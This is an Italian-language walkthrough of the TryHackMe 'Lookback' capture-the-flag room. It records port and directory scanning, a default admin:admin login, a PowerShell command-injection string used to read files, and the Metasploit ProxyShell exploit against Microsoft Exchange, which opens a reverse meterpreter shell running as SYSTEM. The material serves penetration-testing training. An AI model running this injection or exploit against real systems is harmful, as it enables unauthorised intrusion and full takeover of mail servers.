
#tryhackmelabs #laboratorio 

https://tryhackme.com/certification/junior-penetration-tester/details

https://tryhackme.com/room/lookback

L'azienda Lookback ha appena avviato l'integrazione con Active Directory. A causa della scadenza imminente, l'integratore di sistema ha dovuto accelerare l'implementazione dell'ambiente. Riesci a individuare eventuali vulnerabilità?

_A volte per andare avanti dobbiamo tornare indietro._

_Quindi, se rimani bloccato, prova a guardare indietro!_

```
nmap -Pn -O -v -p- 10.10.201.198
```
```
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
3389/tcp open  ms-wbt-server

```

```
nmap -sVC -p80,443,3389 10.10.201.198
```
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
443/tcp  open  ssl/https
|_http-server-header: Microsoft-IIS/10.0
| http-title: Outlook
|_Requested resource was https://10.10.201.198/owa/auth/logon.aspx?url=https%3a%2f%2f10.10.201.198%2fowa%2f&reason=0
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7
| Subject Alternative Name: DNS:WIN-12OUO7A66M7, DNS:WIN-12OUO7A66M7.thm.local
| Not valid before: 2023-01-25T21:34:02
|_Not valid after:  2028-01-25T21:34:02
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: WIN-12OUO7A66M7
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: WIN-12OUO7A66M7.thm.local
|   DNS_Tree_Name: thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-22T09:46:00+00:00
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7.thm.local
| Not valid before: 2025-06-21T09:39:59
|_Not valid after:  2025-12-21T09:39:59
MAC Address: 02:49:45:63:57:A9 (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

**da SALVARE**
```
gobuster dir -u http://10.10.201.198 -w /usr/share/wordlists/dirb/common.txt -t 50 -k -b "403"
```
trovato
```
Starting gobuster in directory enumeration mode
===============================================================
/rpc                  (Status: 401) [Size: 0]
Progress: 4614 / 4615 (99.98%)
```

```
http://10.10.201.198/rpc
```
finestra login

```
gobuster dir -u https://10.10.201.198:443 -w /usr/share/wordlists/dirb/common.txt -t 50 -k -b "403,401"
```
trovato
```
Starting gobuster in directory enumeration mode
===============================================================
/access.1             (Status: 302) [Size: 130] [--> /owa/access.1]
/access_log.1         (Status: 302) [Size: 134] [--> /owa/access_log.1]
/access-log.1         (Status: 302) [Size: 134] [--> /owa/access-log.1]
/admin.pl             (Status: 302) [Size: 130] [--> /owa/admin.pl]
/admin.cgi            (Status: 302) [Size: 131] [--> /owa/admin.cgi]
/admin.php            (Status: 302) [Size: 131] [--> /owa/admin.php]
/akeeba.backend.log   (Status: 302) [Size: 140] [--> /owa/akeeba.backend.log]
/application.wadl     (Status: 302) [Size: 138] [--> /owa/application.wadl]
/AT-admin.cgi         (Status: 302) [Size: 134] [--> /owa/AT-admin.cgi]
/awstats.conf         (Status: 302) [Size: 134] [--> /owa/awstats.conf]
/cachemgr.cgi         (Status: 302) [Size: 134] [--> /owa/cachemgr.cgi]
/aux                  (Status: 404) [Size: 1914]
/catalog.wci          (Status: 302) [Size: 133] [--> /owa/catalog.wci]
/com1                 (Status: 404) [Size: 1915]
/com3                 (Status: 404) [Size: 1915]
/com2                 (Status: 404) [Size: 1915]
/config.local         (Status: 302) [Size: 134] [--> /owa/config.local]
/con                  (Status: 404) [Size: 1914]
/crossdomain.xml      (Status: 302) [Size: 137] [--> /owa/crossdomain.xml]
/development.log      (Status: 302) [Size: 137] [--> /owa/development.log]
/favicon.ico          (Status: 302) [Size: 133] [--> /owa/favicon.ico]
/getFile.cfm          (Status: 302) [Size: 133] [--> /owa/getFile.cfm]
/global.asax          (Status: 302) [Size: 133] [--> /owa/global.asax]
/function.require     (Status: 302) [Size: 138] [--> /owa/function.require]
/global.asa           (Status: 302) [Size: 132] [--> /owa/global.asa]
/id_rsa.pub           (Status: 302) [Size: 132] [--> /owa/id_rsa.pub]
/index.html           (Status: 302) [Size: 132] [--> /owa/index.html]
/index.php            (Status: 302) [Size: 131] [--> /owa/index.php]
/info.php             (Status: 302) [Size: 130] [--> /owa/info.php]
/install.mysql        (Status: 302) [Size: 135] [--> /owa/install.mysql]
/index.htm            (Status: 302) [Size: 131] [--> /owa/index.htm]
/install.pgsql        (Status: 302) [Size: 135] [--> /owa/install.pgsql]
/lpt1                 (Status: 404) [Size: 1915]
/master.passwd        (Status: 302) [Size: 135] [--> /owa/master.passwd]
/main.mdb             (Status: 302) [Size: 130] [--> /owa/main.mdb]
/MANIFEST.MF          (Status: 302) [Size: 133] [--> /owa/MANIFEST.MF]
/manifest.mf          (Status: 302) [Size: 133] [--> /owa/manifest.mf]
/lpt2                 (Status: 404) [Size: 1915]
/moving.page          (Status: 302) [Size: 133] [--> /owa/moving.page]
/owa                  (Status: 302) [Size: 209] [--> https://10.10.201.198/owa/auth/logon.aspx?url=https%3a%2f%2f10.10.201.198%2fowa&reason=0]
/nul                  (Status: 404) [Size: 1914]
/php.ini              (Status: 302) [Size: 129] [--> /owa/php.ini]
/phpinfo.php          (Status: 302) [Size: 133] [--> /owa/phpinfo.php]
/player.swf           (Status: 302) [Size: 132] [--> /owa/player.swf]
/prn                  (Status: 404) [Size: 1914]
/production.log       (Status: 302) [Size: 136] [--> /owa/production.log]
/putty.reg            (Status: 302) [Size: 131] [--> /owa/putty.reg]
/robots.txt           (Status: 302) [Size: 132] [--> /owa/robots.txt]
/sitemap.gz           (Status: 302) [Size: 132] [--> /owa/sitemap.gz]
/sitemap.xml          (Status: 302) [Size: 133] [--> /owa/sitemap.xml]
/spamlog.log          (Status: 302) [Size: 133] [--> /owa/spamlog.log]
/suspended.page       (Status: 302) [Size: 136] [--> /owa/suspended.page]
/swfobject.js         (Status: 302) [Size: 134] [--> /owa/swfobject.js]
/Thumbs.db            (Status: 302) [Size: 131] [--> /owa/Thumbs.db]
/tar.gz               (Status: 302) [Size: 128] [--> /owa/tar.gz]
/thumbs.db            (Status: 302) [Size: 131] [--> /owa/thumbs.db]
/tar.bz2              (Status: 302) [Size: 129] [--> /owa/tar.bz2]
/upgrade.readme       (Status: 302) [Size: 136] [--> /owa/upgrade.readme]
/web.xml              (Status: 302) [Size: 129] [--> /owa/web.xml]
/web.config           (Status: 302) [Size: 132] [--> /owa/web.config]
/WS_FTP.LOG           (Status: 302) [Size: 132] [--> /owa/WS_FTP.LOG]
/xmlrpc.php           (Status: 302) [Size: 132] [--> /owa/xmlrpc.php]
/xmlrpc_server.php    (Status: 302) [Size: 139] [--> /owa/xmlrpc_server.php]
Progress: 4614 / 4615 (99.98%)

```

Troviamo una finestra di login di outlook
```
https://10.10.201.198/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2f10.10.201.198%2fowa%2f
```

Controlliamo con il plugin **Wappalyzer**, rileva che il server esegue IIS ed Exchange versione 15.2.858

proviamo un'altra enumerazione più approfondita **da Salvare**
```
gobuster dir -u http://10.10.201.198 -w /usr/share/wordlists/dirb/big.txt --exclude-length 0
```
troviamo
```
/TEST                 (Status: 403) [Size: 1233]
/Test                 (Status: 403) [Size: 1233]
/ecp                  (Status: 302) [Size: 209] [--> https://10.10.201.198/owa/auth/logon.aspx?url=https%3a%2f%2f10.10.201.198%2fecp&reason=0]
/test                 (Status: 403) [Size: 1233]
Progress: 20469 / 20470 (100.00%)
[ERROR] Get "http://10.10.201.198/sapi": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
===========================
```

```
https://10.10.201.198/test/
```
ci restituisce un form di login

proviamo a vedere che informazioni ci da nikto **da fare**
```
nikto -h https://10.10.201.198/test
```

```
^Croot@ip-10-10-230-209:~# nikto -h https://10.10.201.198/test
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.201.198
+ Target Hostname:    10.10.201.198
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject: /CN=WIN-12OUO7A66M7
                   Ciphers: ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:  /CN=WIN-12OUO7A66M7
+ Start Time:         2025-06-22 11:47:18 (GMT1)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ Retrieved x-aspnet-version header: 4.0.30319
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Default account found for '10.10.201.198' at /test/images (ID 'admin', PW 'admin'). Generic account discovered..
+ Hostname '10.10.201.198' does not match certificate's CN 'WIN-12OUO7A66M7'
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 

```
ci dice che possiamo loggarci con admin:admin

lo facciamo ed otteniamo la prima flag!
```
This interface should be removed on production!

THM{Security_Through_Obscurity_Is_Not_A_Defense}

LOG ANALYZER

Path:

List generated at 9:42:08 AM.

```

```
THM{Security_Through_Obscurity_Is_Not_A_Defense}
```

ora se digitiamo la dir temp ed inviamo ci restituisce
```
Get-Content : Cannot find path 'C:\temp' because it does not exist.
At line:1 char:1
+ Get-Content('C:\temp')
+ ~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\temp:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
```
notiamo che sono comandi powershell

proviamo ad eseguire una **PowerShell Injection**  **dafare**
con
```
BitlockerActiveMonitoringLogs') ; dir #('
```
per ottenere il contenuto della dir
```
Directory: C:\windows\system32\inetsrv


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        1/25/2023   1:35 PM                backup                                                                
d-----        1/25/2023  12:12 PM                Config                                                                
d-----        1/25/2023  12:12 PM                en                                                                    
d-----        1/25/2023   1:04 PM                en-US                                                                 
d-----        6/22/2025   2:42 AM                History                                                               
d-----        1/25/2023  12:44 PM                MetaBack                                                              
-a----        1/25/2023  12:44 PM         252928 abocomp.dll                                                           
-a----        1/25/2023  12:44 PM         324608 adsiis.dll                                                            
-a----        1/25/2023  12:12 PM         119808 appcmd.exe                                                            
-a----        9/15/2018  12:14 AM           3810 appcmd.xml                                                            
-a----        1/25/2023  12:12 PM         181760 AppHostNavigators.dll                                                 
-a----        1/25/2023  12:11 PM          80896 apphostsvc.dll                                                        
-a----        1/25/2023  12:12 PM         406016 appobj.dll                                                            
-a----        1/25/2023  12:15 PM         504320 asp.dll                                                               
-a----        1/25/2023  12:15 PM          22196 asp.mof                                                               
-a----        1/25/2023  12:11 PM         131072 aspnetca.exe                                                          
-a----        1/25/2023  12:15 PM          23040 asptlb.tlb                                                            
-a----        1/25/2023  12:12 PM          40448 authanon.dll                                                          
-a----        1/25/2023  12:15 PM          38400 authbas.dll                                                           
-a----        1/25/2023  12:15 PM          27136 authcert.dll                                                          
-a----        1/25/2023  12:15 PM          44544 authmap.dll                                                           
-a----        1/25/2023  12:15 PM          40960 authmd5.dll                                                           
-a----        1/25/2023  12:15 PM          52736 authsspi.dll                                                          
-a----        1/25/2023  12:15 PM          74240 browscap.dll                                                          
-a----        1/25/2023  12:15 PM          34474 browscap.ini                                                          
-a----        1/25/2023  12:11 PM          24064 cachfile.dll                                                          
-a----        1/25/2023  12:11 PM          52224 cachhttp.dll                                                          
-a----        1/25/2023  12:11 PM          15872 cachtokn.dll                                                          
-a----        1/25/2023  12:11 PM          14336 cachuri.dll                                                           
-a----        1/25/2023  12:15 PM          43520 cgi.dll                                                               
-a----        1/25/2023  12:54 PM          99328 Cnfgprts.ocx                                                          
-a----        1/25/2023  12:44 PM          86528 coadmin.dll                                                           
-a----        1/25/2023  12:15 PM          43008 compdyn.dll                                                           
-a----        1/25/2023  12:11 PM          54784 compstat.dll                                                          
-a----        1/25/2023  12:12 PM          47104 custerr.dll                                                           
-a----        1/25/2023  12:11 PM          20480 defdoc.dll                                                            
-a----        1/25/2023  12:15 PM          38912 diprestr.dll                                                          
-a----        1/25/2023  12:11 PM          24064 dirlist.dll                                                           
-a----        1/25/2023  12:15 PM          68096 filter.dll                                                            
-a----        1/25/2023  12:12 PM          38400 gzip.dll                                                              
-a----        1/25/2023  12:11 PM          22016 httpmib.dll                                                           
-a----        1/25/2023  12:11 PM          18432 hwebcore.dll                                                          
-a----        1/25/2023  12:12 PM          63105 iis.msc                                                               
-a----        1/25/2023  12:54 PM          48997 iis6.msc                                                              
-a----        1/25/2023  12:44 PM          26112 iisadmin.dll                                                          
-a----        1/25/2023  12:44 PM        1016832 iiscfg.dll                                                            
-a----        1/25/2023  12:11 PM         307200 iiscore.dll                                                           
-a----        1/25/2023  12:15 PM         132608 iisetw.dll                                                            
-a----        1/25/2023  12:44 PM         104448 iisext.dll                                                            
-a----        1/25/2023  12:15 PM          86016 iisfcgi.dll                                                           
-a----        1/25/2023  12:15 PM         168448 iisfreb.dll                                                           
-a----        1/25/2023  12:15 PM          88576 iislog.dll                                                            
-a----        1/25/2023  12:11 PM         110080 iisreg.dll                                                            
-a----        1/25/2023  12:15 PM          18432 iisreqs.dll                                                           
-a----        1/25/2023  12:12 PM         231936 iisres.dll                                                            
-a----        1/25/2023  12:11 PM          37888 iisrstas.exe                                                          
-a----        1/25/2023  12:12 PM         192512 iissetup.exe                                                          
-a----        1/25/2023  12:12 PM          57344 iissyspr.dll                                                          
-a----        1/25/2023  12:11 PM          14848 iisual.exe                                                            
-a----        1/25/2023  12:54 PM         262656 iisui.dll                                                             
-a----        1/25/2023  12:54 PM          81408 IISUiObj.dll                                                          
-a----        1/25/2023  12:12 PM         284672 iisutil.dll                                                           
-a----        1/25/2023  12:12 PM         612864 iisw3adm.dll                                                          
-a----        1/25/2023  12:54 PM         260608 iiswmi.dll                                                            
-a----        1/25/2023  12:15 PM          33792 iis_ssi.dll                                                           
-a----        1/25/2023  12:44 PM          16896 inetinfo.exe                                                          
-a----        1/25/2023  12:54 PM         932352 inetmgr.dll                                                           
-a----        1/25/2023  12:12 PM         125440 InetMgr.exe                                                           
-a----        1/25/2023  12:54 PM          25088 InetMgr6.exe                                                          
-a----        1/25/2023  12:44 PM         256000 infocomm.dll                                                          
-a----        1/25/2023  12:15 PM          30208 iprestr.dll                                                           
-a----        1/25/2023  12:15 PM         131584 isapi.dll                                                             
-a----        1/25/2023  12:44 PM          67072 isatq.dll                                                             
-a----        1/25/2023  12:44 PM          25600 iscomlog.dll                                                          
-a----        1/25/2023  12:15 PM          24064 logcust.dll                                                           
-a----        1/25/2023  12:12 PM          36352 loghttp.dll                                                           
-a----        1/25/2023  12:54 PM          39424 logscrpt.dll                                                          
-a----        1/25/2023  12:15 PM            330 logtemp.sql                                                           
-a----        1/25/2023  12:54 PM          88064 logui.ocx                                                             
-a----        1/25/2023  12:44 PM         685464 MBSchema.bin.00000000h                                                
-a----        1/25/2023  12:44 PM         266906 MBSchema.xml                                                          
-a----        6/22/2025   2:42 AM          10152 MetaBase.xml                                                          
-a----        1/25/2023  12:44 PM         334848 metadata.dll                                                          
-a----        1/25/2023  12:11 PM         147456 Microsoft.Web.Administration.dll                                      
-a----        1/25/2023  12:12 PM        1052672 Microsoft.Web.Management.dll                                          
-a----        1/25/2023  12:11 PM          44032 modrqflt.dll                                                          
-a----        1/25/2023  12:12 PM         478720 nativerd.dll                                                          
-a----        1/25/2023  12:12 PM          27136 protsup.dll                                                           
-a----        1/25/2023  12:15 PM          21504 redirect.dll                                                          
-a----        1/25/2023  12:44 PM          10752 rpcref.dll                                                            
-a----        1/25/2023  12:12 PM          33792 rsca.dll                                                              
-a----        1/25/2023  12:12 PM          51200 rscaext.dll                                                           
-a----        1/25/2023  12:11 PM          40448 static.dll                                                            
-a----        1/25/2023  12:54 PM          18944 svcext.dll                                                            
-a----        1/25/2023  12:11 PM         189952 uihelper.dll                                                          
-a----        1/25/2023  12:15 PM          23552 urlauthz.dll                                                          
-a----        1/25/2023  12:54 PM          21504 validcfg.dll                                                          
-a----        1/25/2023  12:15 PM         146250 w3core.mof                                                            
-a----        1/25/2023  12:12 PM          16384 w3ctrlps.dll                                                          
-a----        1/25/2023  12:11 PM          29696 w3ctrs.dll                                                            
-a----        1/25/2023  12:11 PM         109568 w3dt.dll                                                              
-a----        1/25/2023  12:15 PM           2560 w3isapi.mof                                                           
-a----        1/25/2023  12:12 PM         101888 w3logsvc.dll                                                          
-a----        1/25/2023  12:12 PM          29184 w3tp.dll                                                              
-a----        1/25/2023  12:11 PM          26624 w3wp.exe                                                              
-a----        1/25/2023  12:12 PM          78336 w3wphost.dll                                                          
-a----        1/25/2023  12:44 PM          39936 wamreg.dll                                                            
-a----        1/25/2023  12:12 PM          31744 wbhstipm.dll                                                          
-a----        1/25/2023  12:12 PM          27648 wbhst_pm.dll                                                          
-a----        1/25/2023  12:15 PM         189952 webdav.dll                                                            
-a----        1/25/2023  12:15 PM          23552 webdav_simple_lock.dll                                                
-a----        1/25/2023  12:15 PM          20480 webdav_simple_prop.dll                                                
-a----        1/25/2023  12:54 PM          12288 WMSvc.exe                                                             
-a----        9/15/2018  12:13 AM            165 wmsvc.exe.config                                                      
-a----        1/25/2023  12:12 PM         169984 XPath.dll                                                             

```

abbiamo visto che funziona! andiamo alla ricera del flag Utente

```
BitlockerActiveMonitoringLogs') ; dir C:\Users #('
```

cerchiamo ancora fino a trovare

```
BitlockerActiveMonitoringLogs') ; type C:\Users\dev\Desktop\user.txt #('
```
ecco la flag Utente
```
THM{Stop_Reading_Start_Doing}
```
esplorando i file nel Desktop troviamo anche un file con info utili TODO.txt
```
BitlockerActiveMonitoringLogs') ; type C:\Users\dev\Desktop\TODO.txt #('
```

```
This is the tasks list for the deadline:

Promote Server to Domain Controller [DONE]
Setup Microsoft Exchange [DONE]
Setup IIS [DONE]
Remove the log analyzer[TO BE DONE]
Add all the users from the infra department [TO BE DONE]
Install the Security Update for MS Exchange [TO BE DONE]
Setup LAPS [TO BE DONE]


When you are done with the tasks please send an email to:

joe@thm.local
carol@thm.local
and do not forget to put in CC the infra team!
dev-infrastracture-team@thm.local

```
quindi c'è una vulnerabilità in MS Exchange
avevamo visto in precedenza che la sua versione è 15.2.858

cerchiamo una vulnerabilità da sfruttare con metasploit

```
msfconsole
```

```
search exchange Proxy
```

utilizziamo
```
use exploit/windows/http/exchange_proxyshell_rce
```

```
show options
```

```
 SRVHOST  0.0.0.0          yes       The local host or network interface to listen o
                                       n. This must be an address on the local machine
                                        or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, pro
                                        cess, none)
   LHOST                      yes       The listen address (an interface may be specif
                                        ied)
   LPORT     4444             yes       The listen port

```

```
set RHOST 10.10.201.198
```

```
set LHOST 10.10.230.209
```

```
set EMAIL dev-infrastracture-team@thm.local  
```

```
run
```

```
[*] Waiting for the export request to complete...
[+] The mailbox export request has completed
[*] Triggering the payload
[*] Sending stage (203846 bytes) to 10.10.201.198
[+] Deleted C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\j5Q5V0Xjz699.aspx
[*] Meterpreter session 1 opened (10.10.230.209:4444 -> 10.10.201.198:15738) at 2025-06-22 12:52:38 +0100
[*] Removing the mailbox export request
[*] Removing the draft email

meterpreter > 


```

```
shell
```

```
whoami
```

```
meterpreter > shell
Process 15468 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\system

c:\windows\system32\inetsrv>


```
andiamo alla ricerca della flag sul Desktop dell'amministratore
```
cd C:\Users\Administrator\Desktop
```

niente da fare la troviamo in..
```
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 762A-C0C6

 Directory of C:\Users\Administrator\Desktop

01/25/2023  09:15 PM    <DIR>          .
01/25/2023  09:15 PM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)  13,151,703,040 bytes free

C:\Users\Administrator\Desktop>cd C:\Users\Administrator\Documents
cd C:\Users\Administrator\Documents

C:\Users\Administrator\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 762A-C0C6

 Directory of C:\Users\Administrator\Documents

02/12/2023  12:57 PM    <DIR>          .
02/12/2023  12:57 PM    <DIR>          ..
02/12/2023  12:57 PM                35 flag.txt
               1 File(s)             35 bytes
               2 Dir(s)  13,161,385,984 bytes free

C:\Users\Administrator\Documents>

```

```
type flag.txt
```

ed otteniamo la nostra flag!
```
C:\Users\Administrator\Documents>type flag.txt
type flag.txt
THM{xxxxxxxxxxxx}
```

```
THM{xxxxxxxxxxx}
```


